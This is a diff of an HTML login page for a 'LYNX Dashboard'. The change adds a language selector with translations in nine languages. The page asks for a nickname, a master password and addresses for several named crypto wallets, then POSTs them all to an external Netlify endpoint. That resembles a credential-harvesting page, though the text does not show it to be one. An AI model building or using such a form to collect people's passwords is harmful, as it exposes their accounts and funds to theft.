@@ -1,4 +1,5 @@
-<!DOCTYPE html><html lang="en">
+<!DOCTYPE html>
+<html lang="en">
 <head>
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
@@ -32,6 +33,7 @@
       max-width: 500px;
       padding: 2rem;
       color: white;
+      position: relative;
     }
     h2 {
       margin-bottom: 1rem;
@@ -82,30 +84,145 @@
       position: absolute;
       top: 1rem;
       left: 1rem;
+      color: white;
+    }
+    .lang-toggle select {
+      background: transparent;
+      color: white;
+      border: 1px solid white;
+      padding: 4px 8px;
+      border-radius: 6px;
     }
   </style>
 </head>
 <body>
   <div class="glass-container">
-    <h2>ورود به داشبورد LYNX</h2>
-    <label for="nickname">نام مستعار</label>
-    <input type="text" id="nickname" placeholder="مثلاً: مشدی" /><label for="master-password">رمز ورود</label>
-<input type="password" id="master-password" placeholder="رمز ورود کلی" />
+    <div class="lang-toggle">
+      <select id="languageSelect">
+        <option value="en">English</option>
+        <option value="fa">فارسی</option>
+        <option value="zh">中文</option>
+        <option value="ru">Русский</option>
+        <option value="tr">Türkçe</option>
+        <option value="ar">العربية</option>
+        <option value="fr">Français</option>
+        <option value="es">Español</option>
+        <option value="de">Deutsch</option>
+      </select>
+    </div>
+    <h2 id="title">ورود به داشبورد LYNX</h2>
+    <label for="nickname" id="labelNickname">نام مستعار</label>
+    <input type="text" id="nickname" placeholder="مثلاً: مشدی" />
+    <label for="master-password" id="labelPassword">رمز ورود</label>
+    <input type="password" id="master-password" placeholder="رمز ورود کلی" />
 
-<div class="wallet-list" id="wallets">
-  <!-- کیف پول‌ها به صورت داینامیک اضافه می‌شن -->
-</div>
+    <div class="wallet-list" id="wallets">
+      <!-- کیف پول‌ها اضافه می‌شن -->
+    </div>
 
-<button onclick="submitForm()">ثبت اطلاعات</button>
+    <button onclick="submitForm()" id="submitBtn">ثبت اطلاعات</button>
+  </div>
 
-  </div>  <script>
+  <script>
+    const translations = {
+      en: {
+        title: "Login to LYNX Dashboard",
+        nickname: "Nickname",
+        placeholderNick: "e.g., Mashdi",
+        password: "Master Password",
+        placeholderPass: "Your main password",
+        submit: "Submit",
+        alertSuccess: "Registration successful!",
+        alertFail: "Registration failed. Please try again."
+      },
+      fa: {
+        title: "ورود به داشبورد LYNX",
+        nickname: "نام مستعار",
+        placeholderNick: "مثلاً: مشدی",
+        password: "رمز ورود",
+        placeholderPass: "رمز ورود کلی",
+        submit: "ثبت اطلاعات",
+        alertSuccess: "ثبت‌نام با موفقیت انجام شد!",
+        alertFail: "خطا در ثبت‌نام. لطفاً دوباره تلاش کنید."
+      },
+      zh: {
+        title: "登录 LYNX 控制面板",
+        nickname: "昵称",
+        placeholderNick: "例如: Mashdi",
+        password: "主密码",
+        placeholderPass: "您的主密码",
+        submit: "提交",
+        alertSuccess: "注册成功！",
+        alertFail: "注册失败。请再试一次。"
+      },
+      ru: {
+        title: "Вход в панель LYNX",
+        nickname: "Никнейм",
+        placeholderNick: "например: Mashdi",
+        password: "Мастер-пароль",
+        placeholderPass: "Ваш основной пароль",
+        submit: "Отправить",
+        alertSuccess: "Регистрация прошла успешно!",
+        alertFail: "Ошибка регистрации. Попробуйте снова."
+      },
+      tr: {
+        title: "LYNX Kontrol Paneline Giriş",
+        nickname: "Takma Ad",
+        placeholderNick: "örneğin: Mashdi",
+        password: "Ana Şifre",
+        placeholderPass: "Ana şifreniz",
+        submit: "Gönder",
+        alertSuccess: "Kayıt başarıyla tamamlandı!",
+        alertFail: "Kayıt başarısız. Lütfen tekrar deneyin."
+      },
+      ar: {
+        title: "تسجيل الدخول إلى لوحة LYNX",
+        nickname: "اسم مستعار",
+        placeholderNick: "مثلاً: مشدي",
+        password: "كلمة المرور الرئيسية",
+        placeholderPass: "كلمة مرورك الرئيسية",
+        submit: "إرسال",
+        alertSuccess: "تم التسجيل بنجاح!",
+        alertFail: "فشل التسجيل. حاول مرة أخرى."
+      },
+      fr: {
+        title: "Connexion au tableau de bord LYNX",
+        nickname: "Surnom",
+        placeholderNick: "ex: Mashdi",
+        password: "Mot de passe principal",
+        placeholderPass: "Votre mot de passe principal",
+        submit: "Soumettre",
+        alertSuccess: "Inscription réussie !",
+        alertFail: "Échec de l'inscription. Veuillez réessayer."
+      },
+      es: {
+        title: "Iniciar sesión en LYNX",
+        nickname: "Apodo",
+        placeholderNick: "ej: Mashdi",
+        password: "Contraseña maestra",
+        placeholderPass: "Tu contraseña principal",
+        submit: "Enviar",
+        alertSuccess: "¡Registro exitoso!",
+        alertFail: "Error en el registro. Inténtalo de nuevo."
+      },
+      de: {
+        title: "Anmeldung zum LYNX-Dashboard",
+        nickname: "Spitzname",
+        placeholderNick: "z.B. Mashdi",
+        password: "Master-Passwort",
+        placeholderPass: "Ihr Hauptpasswort",
+        submit: "Absenden",
+        alertSuccess: "Registrierung erfolgreich!",
+        alertFail: "Registrierung fehlgeschlagen. Bitte versuchen Sie es erneut."
+      }
+    };
+
     const walletData = [
-      { name: "MetaMask", logo: "metamask.png" },
-      { name: "Trust Wallet", logo: "trustwallet.png" },
-      { name: "Coinbase", logo: "coinbase.png" },
-      { name: "Binance", logo: "binance.png" },
-      { name: "Phantom", logo: "phantom.png" },
-      // تا ۲۰ کیف پول قابل افزایش
+      { name: "MetaMask", logo: "wallets/metamask.png" },
+      { name: "Trust Wallet", logo: "wallets/trustwallet.png" },
+      { name: "Coinbase", logo: "wallets/coinbase.png" },
+      { name: "Binance", logo: "wallets/binance.png" },
+      { name: "Phantom", logo: "wallets/phantom.png" }
     ];
 
     const walletContainer = document.getElementById("wallets");
@@ -113,13 +230,15 @@
       const item = document.createElement("div");
       item.className = "wallet-item";
       item.innerHTML = `
-        <img src="wallets/${wallet.logo}" alt="${wallet.name}" />
+        <img src="${wallet.logo}" alt="${wallet.name}" />
         <input type="text" placeholder="آدرس ${wallet.name}" id="${wallet.name}" />
       `;
       walletContainer.appendChild(item);
     });
 
     function submitForm() {
+      const lang = localStorage.getItem("lang") || "fa";
+      const t = translations[lang];
       const nickname = document.getElementById("nickname").value;
       const masterPass = document.getElementById("master-password").value;
       const wallets = {};
@@ -133,14 +252,36 @@
         wallets,
         time: new Date().toISOString()
       };
-      // ارسال خودکار به سرور
       fetch("https://lynx-connection.netlify.app/api/register", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify(payload)
       })
-      .then(() => alert("ثبت‌نام با موفقیت انجام شد!"))
-      .catch(() => alert("خطا در ثبت‌نام. لطفاً دوباره تلاش کنید."));
+      .then(() => alert(t.alertSuccess))
+      .catch(() => alert(t.alertFail));
     }
-  </script></body>
+
+    function applyLanguage(lang) {
+      localStorage.setItem("lang", lang);
+      const t = translations[lang];
+      document.getElementById("title").innerText = t.title;
+      document.getElementById("labelNickname").innerText = t.nickname;
+      document.getElementById("nickname").placeholder = t.placeholderNick;
+      document.getElementById("labelPassword").innerText = t.password;
+      document.getElementById("master-password").placeholder = t.placeholderPass;
+      document.getElementById("submitBtn").innerText = t.submit;
+      document.getElementById("languageSelect").value = lang;
+      document.body.style.direction = lang === "fa" || lang === "ar" ? "rtl" : "ltr";
+    }
+
+    document.getElementById("languageSelect").addEventListener("change", (e) => {
+      applyLanguage(e.target.value);
+    });
+
+    window.addEventListener("DOMContentLoaded", () => {
+      const lang = localStorage.getItem("lang") || "fa";
+      applyLanguage(lang);
+    });
+  </script>
+</body>
 </html>
